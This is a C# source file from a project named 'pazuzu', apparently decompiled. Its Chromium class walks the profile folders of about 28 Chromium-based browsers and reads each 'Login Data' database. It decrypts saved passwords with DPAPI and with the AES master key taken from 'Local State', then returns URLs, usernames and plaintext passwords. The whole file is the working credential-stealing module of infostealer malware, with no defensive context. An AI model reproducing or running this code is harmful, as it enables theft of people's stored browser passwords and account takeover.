using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using pazuzu.Required;

namespace pazuzu.ChromiumBased;

internal class Chromium
{
	public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static List<Account> Grab()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{
				"Chrome",
				LocalApplicationData + "\\Google\\Chrome\\User Data"
			},
			{
				"Opera",
				Path.Combine(ApplicationData, "Opera Software\\Opera Stable")
			},
			{
				"Yandex",
				Path.Combine(LocalApplicationData, "Yandex\\YandexBrowser\\User Data")
			},
			{
				"360 Browser",
				LocalApplicationData + "\\360Chrome\\Chrome\\User Data"
			},
			{
				"Comodo Dragon",
				Path.Combine(LocalApplicationData, "Comodo\\Dragon\\User Data")
			},
			{
				"CoolNovo",
				Path.Combine(LocalApplicationData, "MapleStudio\\ChromePlus\\User Data")
			},
			{
				"SRWare Iron",
				Path.Combine(LocalApplicationData, "Chromium\\User Data")
			},
			{
				"Torch Browser",
				Path.Combine(LocalApplicationData, "Torch\\User Data")
			},
			{
				"Brave Browser",
				Path.Combine(LocalApplicationData, "BraveSoftware\\Brave-Browser\\User Data")
			},
			{
				"Iridium Browser",
				LocalApplicationData + "\\Iridium\\User Data"
			},
			{
				"7Star",
				Path.Combine(LocalApplicationData, "7Star\\7Star\\User Data")
			},
			{
				"Amigo",
				Path.Combine(LocalApplicationData, "Amigo\\User Data")
			},
			{
				"CentBrowser",
				Path.Combine(LocalApplicationData, "CentBrowser\\User Data")
			},
			{
				"Chedot",
				Path.Combine(LocalApplicationData, "Chedot\\User Data")
			},
			{
				"CocCoc",
				Path.Combine(LocalApplicationData, "CocCoc\\Browser\\User Data")
			},
			{
				"Elements Browser",
				Path.Combine(LocalApplicationData, "Elements Browser\\User Data")
			},
			{
				"Epic Privacy Browser",
				Path.Combine(LocalApplicationData, "Epic Privacy Browser\\User Data")
			},
			{
				"Kometa",
				Path.Combine(LocalApplicationData, "Kometa\\User Data")
			},
			{
				"Orbitum",
				Path.Combine(LocalApplicationData, "Orbitum\\User Data")
			},
			{
				"Sputnik",
				Path.Combine(LocalApplicationData, "Sputnik\\Sputnik\\User Data")
			},
			{
				"uCozMedia",
				Path.Combine(LocalApplicationData, "uCozMedia\\Uran\\User Data")
			},
			{
				"Vivaldi",
				Path.Combine(LocalApplicationData, "Vivaldi\\User Data")
			},
			{
				"Sleipnir 6",
				Path.Combine(ApplicationData, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")
			},
			{
				"Citrio",
				Path.Combine(LocalApplicationData, "CatalinaGroup\\Citrio\\User Data")
			},
			{
				"Coowon",
				Path.Combine(LocalApplicationData, "Coowon\\Coowon\\User Data")
			},
			{
				"Liebao Browser",
				Path.Combine(LocalApplicationData, "liebao\\User Data")
			},
			{
				"QIP Surf",
				Path.Combine(LocalApplicationData, "QIP Surf\\User Data")
			},
			{
				"Edge Chromium",
				Path.Combine(LocalApplicationData, "Microsoft\\Edge\\User Data")
			}
		};
		List<Account> list = new List<Account>();
		foreach (KeyValuePair<string, string> item in dictionary)
		{
			list.AddRange(Accounts(item.Value, item.Key));
		}
		return list;
	}

	private static List<Account> Accounts(string path, string browser, string table = "logins")
	{
		List<string> allProfiles = GetAllProfiles(path);
		List<Account> list = new List<Account>();
		string[] array = allProfiles.ToArray();
		foreach (string text in array)
		{
			if (!File.Exists(text))
			{
				continue;
			}
			SQLiteHandler sQLiteHandler;
			try
			{
				sQLiteHandler = new SQLiteHandler(text);
			}
			catch (Exception)
			{
				continue;
			}
			if (!sQLiteHandler.ReadTable(table))
			{
				continue;
			}
			for (int j = 0; j <= sQLiteHandler.GetRowCount() - 1; j++)
			{
				try
				{
					string value = sQLiteHandler.GetValue(j, "origin_url");
					string value2 = sQLiteHandler.GetValue(j, "username_value");
					string value3 = sQLiteHandler.GetValue(j, "password_value");
					if (value3 != null)
					{
						if (!value3.StartsWith("v10") && !value3.StartsWith("v11"))
						{
							value3 = Decrypt(value3);
							goto IL_0108;
						}
						byte[] masterKey = GetMasterKey(Directory.GetParent(text)!.Parent!.FullName);
						if (masterKey != null)
						{
							value3 = DecryptWithKey(Encoding.Default.GetBytes(value3), masterKey);
							goto IL_0108;
						}
					}
					goto end_IL_006e;
					IL_0108:
					if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
					{
						list.Add(new Account
						{
							URL = value,
							UserName = value2,
							Password = value3,
							Application = browser
						});
					}
					end_IL_006e:;
				}
				catch (Exception)
				{
				}
			}
		}
		return list;
	}

	private static List<string> GetAllProfiles(string DirectoryPath)
	{
		List<string> list = new List<string>
		{
			DirectoryPath + "\\Default\\Login Data",
			DirectoryPath + "\\Login Data"
		};
		if (Directory.Exists(DirectoryPath))
		{
			string[] directories = Directory.GetDirectories(DirectoryPath);
			foreach (string text in directories)
			{
				if (text.Contains("Profile"))
				{
					list.Add(text + "\\Login Data");
				}
			}
		}
		return list;
	}

	public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
	{
		byte[] array = new byte[12];
		Array.Copy(encryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[encryptedData.Length - 15];
			Array.Copy(encryptedData, 15, array2, 0, encryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			AesD aesD = new AesD();
			return Encoding.UTF8.GetString(aesD.Decrypt(MasterKey, array, null, array4, array3));
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] GetMasterKey(string LocalStateFolder)
	{
		string path = LocalStateFolder + "\\Local State";
		byte[] array = new byte[0];
		if (!File.Exists(path))
		{
			return null;
		}
		MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
		foreach (Match item in matchCollection)
		{
			if (item.Success)
			{
				array = Convert.FromBase64String(item.Groups[1].Value);
			}
		}
		byte[] array2 = new byte[array.Length - 5];
		Array.Copy(array, 5, array2, 0, array.Length - 5);
		try
		{
			return ProtectedData.Unprotect(array2, (byte[])null, (DataProtectionScope)0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string Decrypt(string encryptedData)
	{
		if (encryptedData == null || encryptedData.Length == 0)
		{
			return null;
		}
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), (byte[])null, (DataProtectionScope)0));
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static string DDecrypt(string data)
	{
		if (data == null)
		{
			return null;
		}
		byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(data), (byte[])null, (DataProtectionScope)0);
		return Encoding.UTF8.GetString(bytes);
	}
}
